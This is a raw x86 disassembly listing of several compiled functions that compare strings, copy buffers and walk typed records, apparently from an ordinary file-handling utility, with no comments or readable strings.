  401de5:	83 f8 ff             	cmp    $0xffffffff,%eax
  401de8:	75 33                	jne    0x401e1d
  401dea:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401dee:	50                   	push   %eax
  401def:	68 ac 04 42 00       	push   $0x4204ac
  401df4:	e8 17 fc ff ff       	call   0x401a10
  401df9:	56                   	push   %esi
  401dfa:	e8 57 7e 00 00       	call   0x409c56
  401dff:	83 c4 0c             	add    $0xc,%esp
  401e02:	83 c8 ff             	or     $0xffffffff,%eax
  401e05:	5f                   	pop    %edi
  401e06:	5e                   	pop    %esi
  401e07:	5b                   	pop    %ebx
  401e08:	8b 8c 24 00 50 00 00 	mov    0x5000(%esp),%ecx
  401e0f:	33 cc                	xor    %esp,%ecx
  401e11:	e8 4e 5c 00 00       	call   0x407a64
  401e16:	81 c4 04 50 00 00    	add    $0x5004,%esp
  401e1c:	c3                   	ret
  401e1d:	8b 8c 24 0c 50 00 00 	mov    0x500c(%esp),%ecx
  401e24:	33 c0                	xor    %eax,%eax
  401e26:	5f                   	pop    %edi
  401e27:	5e                   	pop    %esi
  401e28:	5b                   	pop    %ebx
  401e29:	33 cc                	xor    %esp,%ecx
  401e2b:	e8 34 5c 00 00       	call   0x407a64
  401e30:	81 c4 04 50 00 00    	add    $0x5004,%esp
  401e36:	c3                   	ret
  401e37:	cc                   	int3
  401e38:	cc                   	int3
  401e39:	cc                   	int3
  401e3a:	cc                   	int3
  401e3b:	cc                   	int3
  401e3c:	cc                   	int3
  401e3d:	cc                   	int3
  401e3e:	cc                   	int3
  401e3f:	cc                   	int3
  401e40:	53                   	push   %ebx
  401e41:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401e45:	ff 33                	push   (%ebx)
  401e47:	e8 04 1e 00 00       	call   0x403c50
  401e4c:	83 c4 04             	add    $0x4,%esp
  401e4f:	83 f8 ff             	cmp    $0xffffffff,%eax
  401e52:	75 04                	jne    0x401e58
  401e54:	33 c0                	xor    %eax,%eax
  401e56:	5b                   	pop    %ebx
  401e57:	c3                   	ret
  401e58:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  401e5c:	8d 43 04             	lea    0x4(%ebx),%eax
  401e5f:	55                   	push   %ebp
  401e60:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  401e64:	57                   	push   %edi
  401e65:	bf 01 00 00 00       	mov    $0x1,%edi
  401e6a:	74 3e                	je     0x401eaa
  401e6c:	0f 1f 40 00          	nopl   0x0(%eax)
  401e70:	8b 00                	mov    (%eax),%eax
  401e72:	8b cd                	mov    %ebp,%ecx
  401e74:	83 c0 68             	add    $0x68,%eax
  401e77:	8a 10                	mov    (%eax),%dl
  401e79:	3a 11                	cmp    (%ecx),%dl
  401e7b:	75 1a                	jne    0x401e97
  401e7d:	84 d2                	test   %dl,%dl
  401e7f:	74 12                	je     0x401e93
  401e81:	8a 50 01             	mov    0x1(%eax),%dl
  401e84:	3a 51 01             	cmp    0x1(%ecx),%dl
  401e87:	75 0e                	jne    0x401e97
  401e89:	83 c0 02             	add    $0x2,%eax
  401e8c:	83 c1 02             	add    $0x2,%ecx
  401e8f:	84 d2                	test   %dl,%dl
  401e91:	75 e4                	jne    0x401e77
  401e93:	33 c0                	xor    %eax,%eax
  401e95:	eb 05                	jmp    0x401e9c
  401e97:	1b c0                	sbb    %eax,%eax
  401e99:	83 c8 01             	or     $0x1,%eax
  401e9c:	85 c0                	test   %eax,%eax
  401e9e:	74 37                	je     0x401ed7
  401ea0:	47                   	inc    %edi
  401ea1:	83 3c bb 00          	cmpl   $0x0,(%ebx,%edi,4)
  401ea5:	8d 04 bb             	lea    (%ebx,%edi,4),%eax
  401ea8:	75 c6                	jne    0x401e70
  401eaa:	56                   	push   %esi
  401eab:	68 78 40 00 00       	push   $0x4078
  401eb0:	e8 a6 7d 00 00       	call   0x409c5b
  401eb5:	8b f0                	mov    %eax,%esi
  401eb7:	83 c4 04             	add    $0x4,%esp
  401eba:	85 f6                	test   %esi,%esi
  401ebc:	75 20                	jne    0x401ede
  401ebe:	68 dc 03 42 00       	push   $0x4203dc
  401ec3:	68 70 03 42 00       	push   $0x420370
  401ec8:	e8 23 f9 ff ff       	call   0x4017f0
  401ecd:	83 c4 08             	add    $0x8,%esp
  401ed0:	33 c0                	xor    %eax,%eax
  401ed2:	5e                   	pop    %esi
  401ed3:	5f                   	pop    %edi
  401ed4:	5d                   	pop    %ebp
  401ed5:	5b                   	pop    %ebx
  401ed6:	c3                   	ret
  401ed7:	8b 04 bb             	mov    (%ebx,%edi,4),%eax
  401eda:	5f                   	pop    %edi
  401edb:	5d                   	pop    %ebp
  401edc:	5b                   	pop    %ebx
  401edd:	c3                   	ret
  401ede:	68 00 10 00 00       	push   $0x1000
  401ee3:	8d 46 68             	lea    0x68(%esi),%eax
  401ee6:	55                   	push   %ebp
  401ee7:	50                   	push   %eax
  401ee8:	e8 d3 af 00 00       	call   0x40cec0
  401eed:	8b 03                	mov    (%ebx),%eax
  401eef:	05 68 10 00 00       	add    $0x1068,%eax
  401ef4:	68 00 10 00 00       	push   $0x1000
  401ef9:	50                   	push   %eax
  401efa:	8d 86 68 10 00 00    	lea    0x1068(%esi),%eax
  401f00:	50                   	push   %eax
  401f01:	e8 ba af 00 00       	call   0x40cec0
  401f06:	8b 03                	mov    (%ebx),%eax
  401f08:	05 68 20 00 00       	add    $0x2068,%eax
  401f0d:	68 00 10 00 00       	push   $0x1000
  401f12:	50                   	push   %eax
  401f13:	8d 86 68 20 00 00    	lea    0x2068(%esi),%eax
  401f19:	50                   	push   %eax
  401f1a:	e8 a1 af 00 00       	call   0x40cec0
  401f1f:	83 c4 24             	add    $0x24,%esp
  401f22:	80 be 67 10 00 00 00 	cmpb   $0x0,0x1067(%esi)
  401f29:	75 57                	jne    0x401f82
  401f2b:	80 be 67 20 00 00 00 	cmpb   $0x0,0x2067(%esi)
  401f32:	75 4e                	jne    0x401f82
  401f34:	80 be 67 30 00 00 00 	cmpb   $0x0,0x3067(%esi)
  401f3b:	75 45                	jne    0x401f82
  401f3d:	8b 03                	mov    (%ebx),%eax
  401f3f:	56                   	push   %esi
  401f40:	8b 80 68 40 00 00    	mov    0x4068(%eax),%eax
  401f46:	89 86 68 40 00 00    	mov    %eax,0x4068(%esi)
  401f4c:	e8 0f f6 ff ff       	call   0x401560
  401f51:	83 c4 04             	add    $0x4,%esp
  401f54:	85 c0                	test   %eax,%eax
  401f56:	74 20                	je     0x401f78
  401f58:	55                   	push   %ebp
  401f59:	68 20 04 42 00       	push   $0x420420
  401f5e:	68 70 03 42 00       	push   $0x420370
  401f63:	e8 88 f8 ff ff       	call   0x4017f0
  401f68:	56                   	push   %esi
  401f69:	e8 e8 7c 00 00       	call   0x409c56
  401f6e:	83 c4 10             	add    $0x10,%esp
  401f71:	33 c0                	xor    %eax,%eax
  401f73:	5e                   	pop    %esi
  401f74:	5f                   	pop    %edi
  401f75:	5d                   	pop    %ebp
  401f76:	5b                   	pop    %ebx
  401f77:	c3                   	ret
  401f78:	89 34 bb             	mov    %esi,(%ebx,%edi,4)
  401f7b:	8b c6                	mov    %esi,%eax
  401f7d:	5e                   	pop    %esi
  401f7e:	5f                   	pop    %edi
  401f7f:	5d                   	pop    %ebp
  401f80:	5b                   	pop    %ebx
  401f81:	c3                   	ret
  401f82:	68 00 04 42 00       	push   $0x420400
  401f87:	e8 84 fa ff ff       	call   0x401a10
  401f8c:	56                   	push   %esi
  401f8d:	e8 c4 7c 00 00       	call   0x409c56
  401f92:	83 c4 08             	add    $0x8,%esp
  401f95:	33 c0                	xor    %eax,%eax
  401f97:	5e                   	pop    %esi
  401f98:	5f                   	pop    %edi
  401f99:	5d                   	pop    %ebp
  401f9a:	5b                   	pop    %ebx
  401f9b:	c3                   	ret
  401f9c:	cc                   	int3
  401f9d:	cc                   	int3
  401f9e:	cc                   	int3
  401f9f:	cc                   	int3
  401fa0:	83 ec 34             	sub    $0x34,%esp
  401fa3:	a1 08 c0 42 00       	mov    0x42c008,%eax
  401fa8:	33 c4                	xor    %esp,%eax
  401faa:	89 44 24 30          	mov    %eax,0x30(%esp)
  401fae:	56                   	push   %esi
  401faf:	8b 74 24 3c          	mov    0x3c(%esp),%esi
  401fb3:	8d 44 24 44          	lea    0x44(%esp),%eax
  401fb7:	50                   	push   %eax
  401fb8:	6a 00                	push   $0x0
  401fba:	ff 74 24 48          	push   0x48(%esp)
  401fbe:	68 00 10 00 00       	push   $0x1000
  401fc3:	56                   	push   %esi
  401fc4:	e8 17 f8 ff ff       	call   0x4017e0
  401fc9:	8b 08                	mov    (%eax),%ecx
  401fcb:	ff 70 04             	push   0x4(%eax)
  401fce:	83 c9 01             	or     $0x1,%ecx
  401fd1:	51                   	push   %ecx
  401fd2:	e8 89 ad 00 00       	call   0x40cd60
  401fd7:	8d 44 24 20          	lea    0x20(%esp),%eax
  401fdb:	50                   	push   %eax
  401fdc:	56                   	push   %esi
  401fdd:	e8 11 b8 00 00       	call   0x40d7f3
  401fe2:	8b 4c 24 58          	mov    0x58(%esp),%ecx
  401fe6:	83 c4 24             	add    $0x24,%esp
  401fe9:	5e                   	pop    %esi
  401fea:	33 cc                	xor    %esp,%ecx
  401fec:	e8 73 5a 00 00       	call   0x407a64
  401ff1:	83 c4 34             	add    $0x34,%esp
  401ff4:	c3                   	ret
  401ff5:	cc                   	int3
  401ff6:	cc                   	int3
  401ff7:	cc                   	int3
  401ff8:	cc                   	int3
  401ff9:	cc                   	int3
  401ffa:	cc                   	int3
  401ffb:	cc                   	int3
  401ffc:	cc                   	int3
  401ffd:	cc                   	int3
  401ffe:	cc                   	int3
  401fff:	cc                   	int3
  402000:	56                   	push   %esi
  402001:	8b 74 24 08          	mov    0x8(%esp),%esi
  402005:	56                   	push   %esi
  402006:	e8 45 1c 00 00       	call   0x403c50
  40200b:	83 c4 04             	add    $0x4,%esp
  40200e:	83 f8 ff             	cmp    $0xffffffff,%eax
  402011:	75 04                	jne    0x402017
  402013:	0b c0                	or     %eax,%eax
  402015:	5e                   	pop    %esi
  402016:	c3                   	ret
  402017:	ff 74 24 10          	push   0x10(%esp)
  40201b:	8d 86 68 20 00 00    	lea    0x2068(%esi),%eax
  402021:	50                   	push   %eax
  402022:	ff 74 24 14          	push   0x14(%esp)
  402026:	e8 f5 1a 00 00       	call   0x403b20
  40202b:	40                   	inc    %eax
  40202c:	83 c4 0c             	add    $0xc,%esp
  40202f:	f7 d8                	neg    %eax
  402031:	1b c0                	sbb    %eax,%eax
  402033:	f7 d8                	neg    %eax
  402035:	48                   	dec    %eax
  402036:	5e                   	pop    %esi
  402037:	c3                   	ret
  402038:	cc                   	int3
  402039:	cc                   	int3
  40203a:	cc                   	int3
  40203b:	cc                   	int3
  40203c:	cc                   	int3
  40203d:	cc                   	int3
  40203e:	cc                   	int3
  40203f:	cc                   	int3
  402040:	53                   	push   %ebx
  402041:	56                   	push   %esi
  402042:	57                   	push   %edi
  402043:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402047:	8b 77 08             	mov    0x8(%edi),%esi
  40204a:	3b 77 0c             	cmp    0xc(%edi),%esi
  40204d:	73 51                	jae    0x4020a0
  40204f:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  402053:	8b c3                	mov    %ebx,%eax
  402055:	8d 4e 12             	lea    0x12(%esi),%ecx
  402058:	8a 11                	mov    (%ecx),%dl
  40205a:	3a 10                	cmp    (%eax),%dl
  40205c:	75 1a                	jne    0x402078
  40205e:	84 d2                	test   %dl,%dl
  402060:	74 12                	je     0x402074
  402062:	8a 51 01             	mov    0x1(%ecx),%dl
  402065:	3a 50 01             	cmp    0x1(%eax),%dl
  402068:	75 0e                	jne    0x402078
  40206a:	83 c1 02             	add    $0x2,%ecx
  40206d:	83 c0 02             	add    $0x2,%eax
  402070:	84 d2                	test   %dl,%dl
  402072:	75 e4                	jne    0x402058
  402074:	33 c0                	xor    %eax,%eax
  402076:	eb 05                	jmp    0x40207d
  402078:	1b c0                	sbb    %eax,%eax
  40207a:	83 c8 01             	or     $0x1,%eax
  40207d:	85 c0                	test   %eax,%eax
  40207f:	75 0e                	jne    0x40208f
  402081:	56                   	push   %esi
  402082:	57                   	push   %edi
  402083:	e8 98 f2 ff ff       	call   0x401320
  402088:	83 c4 08             	add    $0x8,%esp
  40208b:	85 c0                	test   %eax,%eax
  40208d:	75 17                	jne    0x4020a6
  40208f:	56                   	push   %esi
  402090:	57                   	push   %edi
  402091:	e8 9a f4 ff ff       	call   0x401530
  402096:	8b f0                	mov    %eax,%esi
  402098:	83 c4 08             	add    $0x8,%esp
  40209b:	3b 77 0c             	cmp    0xc(%edi),%esi
  40209e:	72 b3                	jb     0x402053
  4020a0:	5f                   	pop    %edi
  4020a1:	5e                   	pop    %esi
  4020a2:	33 c0                	xor    %eax,%eax
  4020a4:	5b                   	pop    %ebx
  4020a5:	c3                   	ret
  4020a6:	5f                   	pop    %edi
  4020a7:	5e                   	pop    %esi
  4020a8:	83 c8 ff             	or     $0xffffffff,%eax
  4020ab:	5b                   	pop    %ebx
  4020ac:	c3                   	ret
  4020ad:	cc                   	int3
  4020ae:	cc                   	int3
  4020af:	cc                   	int3
  4020b0:	56                   	push   %esi
  4020b1:	8b 74 24 08          	mov    0x8(%esp),%esi
  4020b5:	56                   	push   %esi
  4020b6:	e8 05 14 00 00       	call   0x4034c0
  4020bb:	83 c4 04             	add    $0x4,%esp
  4020be:	85 c0                	test   %eax,%eax
  4020c0:	74 05                	je     0x4020c7
  4020c2:	83 c8 ff             	or     $0xffffffff,%eax
  4020c5:	5e                   	pop    %esi
  4020c6:	c3                   	ret
  4020c7:	56                   	push   %esi
  4020c8:	c7 86 6c 40 00 00 01 	movl   $0x1,0x406c(%esi)
  4020cf:	00 00 00 
  4020d2:	e8 f9 17 00 00       	call   0x4038d0
  4020d7:	83 c4 04             	add    $0x4,%esp
  4020da:	85 c0                	test   %eax,%eax
  4020dc:	75 e4                	jne    0x4020c2
  4020de:	56                   	push   %esi
  4020df:	e8 fc 10 00 00       	call   0x4031e0
  4020e4:	83 c4 04             	add    $0x4,%esp
  4020e7:	85 c0                	test   %eax,%eax
  4020e9:	75 d7                	jne    0x4020c2
  4020eb:	56                   	push   %esi
  4020ec:	e8 9f 12 00 00       	call   0x403390
  4020f1:	83 c4 04             	add    $0x4,%esp
  4020f4:	85 c0                	test   %eax,%eax
  4020f6:	75 ca                	jne    0x4020c2
  4020f8:	56                   	push   %esi
  4020f9:	e8 62 01 00 00       	call   0x402260
  4020fe:	83 c4 04             	add    $0x4,%esp
  402101:	5e                   	pop    %esi
  402102:	c3                   	ret
  402103:	cc                   	int3
  402104:	cc                   	int3
  402105:	cc                   	int3
  402106:	cc                   	int3
  402107:	cc                   	int3
  402108:	cc                   	int3
  402109:	cc                   	int3
  40210a:	cc                   	int3
  40210b:	cc                   	int3
  40210c:	cc                   	int3
  40210d:	cc                   	int3
  40210e:	cc                   	int3
  40210f:	cc                   	int3
  402110:	83 ec 54             	sub    $0x54,%esp
  402113:	a1 08 c0 42 00       	mov    0x42c008,%eax
  402118:	33 c4                	xor    %esp,%eax
  40211a:	89 44 24 50          	mov    %eax,0x50(%esp)
  40211e:	53                   	push   %ebx
  40211f:	56                   	push   %esi
  402120:	57                   	push   %edi
  402121:	8b 7c 24 64          	mov    0x64(%esp),%edi
  402125:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402129:	6a 50                	push   $0x50
  40212b:	33 db                	xor    %ebx,%ebx
  40212d:	53                   	push   %ebx
  40212e:	8b 77 08             	mov    0x8(%edi),%esi
  402131:	50                   	push   %eax
  402132:	e8 49 66 00 00       	call   0x408780
  402137:	83 c4 0c             	add    $0xc,%esp
  40213a:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  40213e:	3b 77 0c             	cmp    0xc(%edi),%esi
  402141:	73 2c                	jae    0x40216f
  402143:	8a 46 11             	mov    0x11(%esi),%al
  402146:	3c 62                	cmp    $0x62,%al
  402148:	74 5e                	je     0x4021a8
  40214a:	3c 78                	cmp    $0x78,%al
  40214c:	74 5a                	je     0x4021a8
  40214e:	3c 5a                	cmp    $0x5a,%al
  402150:	74 56                	je     0x4021a8
  402152:	3c 64                	cmp    $0x64,%al
  402154:	75 60                	jne    0x4021b6
  402156:	8d 46 12             	lea    0x12(%esi),%eax
  402159:	50                   	push   %eax
  40215a:	8d 44 24 10          	lea    0x10(%esp),%eax
  40215e:	50                   	push   %eax
  40215f:	e8 5c fa ff ff       	call   0x401bc0
  402164:	83 c4 08             	add    $0x8,%esp
  402167:	83 f8 ff             	cmp    $0xffffffff,%eax
  40216a:	75 4a                	jne    0x4021b6
  40216c:	83 cb ff             	or     $0xffffffff,%ebx
  40216f:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  402173:	be 01 00 00 00       	mov    $0x1,%esi
  402178:	85 c9                	test   %ecx,%ecx
  40217a:	74 18                	je     0x402194
  40217c:	0f 1f 40 00          	nopl   0x0(%eax)
  402180:	51                   	push   %ecx
  402181:	e8 1a f6 ff ff       	call   0x4017a0
  402186:	8d 76 01             	lea    0x1(%esi),%esi
  402189:	83 c4 04             	add    $0x4,%esp
  40218c:	8b 4c b4 0c          	mov    0xc(%esp,%esi,4),%ecx
  402190:	85 c9                	test   %ecx,%ecx
  402192:	75 ec                	jne    0x402180
  402194:	8b 4c 24 5c          	mov    0x5c(%esp),%ecx
  402198:	8b c3                	mov    %ebx,%eax
  40219a:	5f                   	pop    %edi
  40219b:	5e                   	pop    %esi
  40219c:	5b                   	pop    %ebx
  40219d:	33 cc                	xor    %esp,%ecx
  40219f:	e8 c0 58 00 00       	call   0x407a64
  4021a4:	83 c4 54             	add    $0x54,%esp
  4021a7:	c3                   	ret
  4021a8:	56                   	push   %esi
  4021a9:	57                   	push   %edi
  4021aa:	e8 71 f1 ff ff       	call   0x401320
  4021af:	83 c4 08             	add    $0x8,%esp
  4021b2:	85 c0                	test   %eax,%eax
  4021b4:	75 b6                	jne    0x40216c
  4021b6:	56                   	push   %esi
  4021b7:	57                   	push   %edi
  4021b8:	e8 73 f3 ff ff       	call   0x401530
  4021bd:	8b f0                	mov    %eax,%esi
  4021bf:	83 c4 08             	add    $0x8,%esp
  4021c2:	3b 77 0c             	cmp    0xc(%edi),%esi
  4021c5:	0f 82 78 ff ff ff    	jb     0x402143
  4021cb:	eb a2                	jmp    0x40216f
  4021cd:	cc                   	int3
  4021ce:	cc                   	int3
  4021cf:	cc                   	int3
  4021d0:	e9 eb 0f 00 00       	jmp    0x4031c0
  4021d5:	cc                   	int3
  4021d6:	cc                   	int3
  4021d7:	cc                   	int3
  4021d8:	cc                   	int3
  4021d9:	cc                   	int3
  4021da:	cc                   	int3
  4021db:	cc                   	int3
  4021dc:	cc                   	int3
  4021dd:	cc                   	int3
  4021de:	cc                   	int3
  4021df:	cc                   	int3
  4021e0:	56                   	push   %esi
  4021e1:	8b 74 24 08          	mov    0x8(%esp),%esi
  4021e5:	68 88 05 42 00       	push   $0x420588
  4021ea:	56                   	push   %esi
  4021eb:	e8 c0 f2 ff ff       	call   0x4014b0
  4021f0:	83 c4 08             	add    $0x8,%esp
  4021f3:	85 c0                	test   %eax,%eax
  4021f5:	74 20                	je     0x402217
  4021f7:	50                   	push   %eax
  4021f8:	8d 86 68 30 00 00    	lea    0x3068(%esi),%eax
  4021fe:	50                   	push   %eax
  4021ff:	6a 00                	push   $0x0
  402201:	e8 4a 08 00 00       	call   0x402a50
  402206:	8b f0                	mov    %eax,%esi
  402208:	56                   	push   %esi
  402209:	e8 82 25 00 00       	call   0x404790
  40220e:	56                   	push   %esi
  40220f:	e8 42 7a 00 00       	call   0x409c56
  402214:	83 c4 14             	add    $0x14,%esp
  402217:	5e                   	pop    %esi
  402218:	c3                   	ret
  402219:	cc                   	int3
  40221a:	cc                   	int3
  40221b:	cc                   	int3
  40221c:	cc                   	int3
  40221d:	cc                   	int3
  40221e:	cc                   	int3
  40221f:	cc                   	int3
  402220:	56                   	push   %esi
  402221:	8b 74 24 08          	mov    0x8(%esp),%esi
  402225:	8b 4e 08             	mov    0x8(%esi),%ecx
  402228:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  40222b:	73 27                	jae    0x402254
  40222d:	0f 1f 00             	nopl   (%eax)
  402230:	8a 41 11             	mov    0x11(%ecx),%al
  402233:	3c 62                	cmp    $0x62,%al
  402235:	74 21                	je     0x402258
  402237:	3c 78                	cmp    $0x78,%al
  402239:	74 1d                	je     0x402258
  40223b:	3c 5a                	cmp    $0x5a,%al
  40223d:	74 19                	je     0x402258
  40223f:	3c 64                	cmp    $0x64,%al
  402241:	74 15                	je     0x402258
  402243:	51                   	push   %ecx
  402244:	56                   	push   %esi
  402245:	e8 e6 f2 ff ff       	call   0x401530
  40224a:	8b c8                	mov    %eax,%ecx
  40224c:	83 c4 08             	add    $0x8,%esp
  40224f:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  402252:	72 dc                	jb     0x402230
  402254:	33 c0                	xor    %eax,%eax
  402256:	5e                   	pop    %esi
  402257:	c3                   	ret
  402258:	b8 01 00 00 00       	mov    $0x1,%eax
  40225d:	5e                   	pop    %esi
  40225e:	c3                   	ret
  40225f:	cc                   	int3
  402260:	b8 10 10 00 00       	mov    $0x1010,%eax
  402265:	e8 16 58 00 00       	call   0x407a80
  40226a:	a1 08 c0 42 00       	mov    0x42c008,%eax
  40226f:	33 c4                	xor    %esp,%eax
  402271:	89 84 24 0c 10 00 00 	mov    %eax,0x100c(%esp)
  402278:	53                   	push   %ebx
  402279:	55                   	push   %ebp
  40227a:	8b ac 24 1c 10 00 00 	mov    0x101c(%esp),%ebp
  402281:	68 c4 04 42 00       	push   $0x4204c4
  402286:	8b 5d 08             	mov    0x8(%ebp),%ebx
  402289:	ff 15 ac c9 42 00    	call   *0x42c9ac
  40228f:	83 c4 04             	add    $0x4,%esp
  402292:	89 44 24 08          	mov    %eax,0x8(%esp)
  402296:	85 c0                	test   %eax,%eax
  402298:	75 27                	jne    0x4022c1
  40229a:	68 d0 04 42 00       	push   $0x4204d0
  40229f:	e8 6c f7 ff ff       	call   0x401a10
  4022a4:	83 c4 04             	add    $0x4,%esp
  4022a7:	83 c8 ff             	or     $0xffffffff,%eax
  4022aa:	5d                   	pop    %ebp
  4022ab:	5b                   	pop    %ebx
  4022ac:	8b 8c 24 0c 10 00 00 	mov    0x100c(%esp),%ecx
  4022b3:	33 cc                	xor    %esp,%ecx
  4022b5:	e8 aa 57 00 00       	call   0x407a64
  4022ba:	81 c4 10 10 00 00    	add    $0x1010,%esp
  4022c0:	c3                   	ret
  4022c1:	50                   	push   %eax
  4022c2:	ff 15 cc c9 42 00    	call   *0x42c9cc
  4022c8:	83 c4 04             	add    $0x4,%esp
  4022cb:	89 44 24 10          	mov    %eax,0x10(%esp)
  4022cf:	85 c0                	test   %eax,%eax
  4022d1:	75 27                	jne    0x4022fa
  4022d3:	68 f0 04 42 00       	push   $0x4204f0
  4022d8:	e8 33 f7 ff ff       	call   0x401a10
  4022dd:	83 c4 04             	add    $0x4,%esp
  4022e0:	83 c8 ff             	or     $0xffffffff,%eax
  4022e3:	5d                   	pop    %ebp
  4022e4:	5b                   	pop    %ebx
  4022e5:	8b 8c 24 0c 10 00 00 	mov    0x100c(%esp),%ecx
  4022ec:	33 cc                	xor    %esp,%ecx
  4022ee:	e8 71 57 00 00       	call   0x407a64
  4022f3:	81 c4 10 10 00 00    	add    $0x1010,%esp
  4022f9:	c3                   	ret
  4022fa:	56                   	push   %esi
  4022fb:	57                   	push   %edi
  4022fc:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  4022ff:	0f 83 e6 00 00 00    	jae    0x4023eb
  402305:	80 7b 11 73          	cmpb   $0x73,0x11(%ebx)
  402309:	0f 85 c7 00 00 00    	jne    0x4023d6
  40230f:	53                   	push   %ebx
  402310:	55                   	push   %ebp
  402311:	e8 0a ef ff ff       	call   0x401220
  402316:	8d 73 12             	lea    0x12(%ebx),%esi
  402319:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40231d:	68 00 10 00 00       	push   $0x1000
  402322:	56                   	push   %esi
  402323:	e8 50 76 00 00       	call   0x409978
  402328:	83 c4 10             	add    $0x10,%esp
  40232b:	3d fc 0f 00 00       	cmp    $0xffc,%eax
  402330:	0f 83 08 01 00 00    	jae    0x40243e
  402336:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  40233a:	2b ce                	sub    %esi,%ecx
  40233c:	0f 1f 40 00          	nopl   0x0(%eax)
  402340:	8a 06                	mov    (%esi),%al
  402342:	8d 76 01             	lea    0x1(%esi),%esi
  402345:	88 44 31 ff          	mov    %al,-0x1(%ecx,%esi,1)
  402349:	84 c0                	test   %al,%al
  40234b:	75 f3                	jne    0x402340
  40234d:	8d 7c 24 1c          	lea    0x1c(%esp),%edi
  402351:	4f                   	dec    %edi
  402352:	8a 47 01             	mov    0x1(%edi),%al
  402355:	8d 7f 01             	lea    0x1(%edi),%edi
  402358:	84 c0                	test   %al,%al
  40235a:	75 f6                	jne    0x402352
  40235c:	83 3d 64 a6 43 00 00 	cmpl   $0x0,0x43a664
  402363:	a1 30 05 42 00       	mov    0x420530,%eax
  402368:	89 07                	mov    %eax,(%edi)
  40236a:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40236e:	50                   	push   %eax
  40236f:	74 08                	je     0x402379
  402371:	ff 15 c0 c9 42 00    	call   *0x42c9c0
  402377:	eb 06                	jmp    0x40237f
  402379:	ff 15 c4 c9 42 00    	call   *0x42c9c4
  40237f:	83 c4 04             	add    $0x4,%esp
  402382:	8b f0                	mov    %eax,%esi
  402384:	56                   	push   %esi
  402385:	68 34 05 42 00       	push   $0x420534
  40238a:	ff 74 24 18          	push   0x18(%esp)
  40238e:	ff 15 b0 c9 42 00    	call   *0x42c9b0
  402394:	56                   	push   %esi
  402395:	ff 15 84 c9 42 00    	call   *0x42c984
  40239b:	83 c4 10             	add    $0x10,%esp
  40239e:	ff 73 0c             	push   0xc(%ebx)
  4023a1:	e8 b8 56 00 00       	call   0x407a5e
  4023a6:	8b 74 24 14          	mov    0x14(%esp),%esi
  4023aa:	50                   	push   %eax
  4023ab:	56                   	push   %esi
  4023ac:	ff 15 08 ca 42 00    	call   *0x42ca08
  4023b2:	83 c4 08             	add    $0x8,%esp
  4023b5:	85 c0                	test   %eax,%eax
  4023b7:	74 69                	je     0x402422
  4023b9:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4023bd:	57                   	push   %edi
  4023be:	57                   	push   %edi
  4023bf:	50                   	push   %eax
  4023c0:	ff 15 04 ca 42 00    	call   *0x42ca04
  4023c6:	83 c4 0c             	add    $0xc,%esp
  4023c9:	85 c0                	test   %eax,%eax
  4023cb:	74 39                	je     0x402406
  4023cd:	56                   	push   %esi
  4023ce:	e8 83 78 00 00       	call   0x409c56
  4023d3:	83 c4 04             	add    $0x4,%esp
  4023d6:	53                   	push   %ebx
  4023d7:	55                   	push   %ebp
  4023d8:	e8 53 f1 ff ff       	call   0x401530
  4023dd:	8b d8                	mov    %eax,%ebx
  4023df:	83 c4 08             	add    $0x8,%esp
  4023e2:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  4023e5:	0f 82 1a ff ff ff    	jb     0x402305
  4023eb:	33 c0                	xor    %eax,%eax
  4023ed:	8b 8c 24 1c 10 00 00 	mov    0x101c(%esp),%ecx
  4023f4:	5f                   	pop    %edi
  4023f5:	5e                   	pop    %esi
  4023f6:	5d                   	pop    %ebp
  4023f7:	5b                   	pop    %ebx
  4023f8:	33 cc                	xor    %esp,%ecx
  4023fa:	e8 65 56 00 00       	call   0x407a64
  4023ff:	81 c4 10 10 00 00    	add    $0x1010,%esp
  402405:	c3                   	ret
  402406:	ff 15 dc c9 42 00    	call   *0x42c9dc
  40240c:	8d 43 12             	lea    0x12(%ebx),%eax
  40240f:	50                   	push   %eax
  402410:	68 68 05 42 00       	push   $0x420568
  402415:	e8 f6 f5 ff ff       	call   0x401a10
  40241a:	83 c4 08             	add    $0x8,%esp
  40241d:	83 c8 ff             	or     $0xffffffff,%eax
  402420:	eb cb                	jmp    0x4023ed
  402422:	8d 43 12             	lea    0x12(%ebx),%eax
  402425:	50                   	push   %eax
  402426:	68 40 05 42 00       	push   $0x420540
  40242b:	e8 e0 f5 ff ff       	call   0x401a10
  402430:	83 c4 08             	add    $0x8,%esp
  402433:	ff 15 dc c9 42 00    	call   *0x42c9dc
  402439:	83 c8 ff             	or     $0xffffffff,%eax
  40243c:	eb af                	jmp    0x4023ed
  40243e:	68 18 05 42 00       	push   $0x420518
  402443:	e8 c8 f5 ff ff       	call   0x401a10
  402448:	83 c4 04             	add    $0x4,%esp
  40244b:	83 c8 ff             	or     $0xffffffff,%eax
  40244e:	eb 9d                	jmp    0x4023ed
  402450:	b8 08 10 00 00       	mov    $0x1008,%eax
  402455:	e8 26 56 00 00       	call   0x407a80
  40245a:	a1 08 c0 42 00       	mov    0x42c008,%eax
  40245f:	33 c4                	xor    %esp,%eax
  402461:	89 84 24 04 10 00 00 	mov    %eax,0x1004(%esp)
  402468:	8b 84 24 14 10 00 00 	mov    0x1014(%esp),%eax
  40246f:	56                   	push   %esi
  402470:	8b b4 24 14 10 00 00 	mov    0x1014(%esp),%esi
  402477:	57                   	push   %edi
  402478:	8b bc 24 14 10 00 00 	mov    0x1014(%esp),%edi
  40247f:	68 01 10 00 00       	push   $0x1001
  402484:	50                   	push   %eax
  402485:	8d 44 24 10          	lea    0x10(%esp),%eax
  402489:	50                   	push   %eax
  40248a:	e8 31 aa 00 00       	call   0x40cec0
  40248f:	83 c4 0c             	add    $0xc,%esp
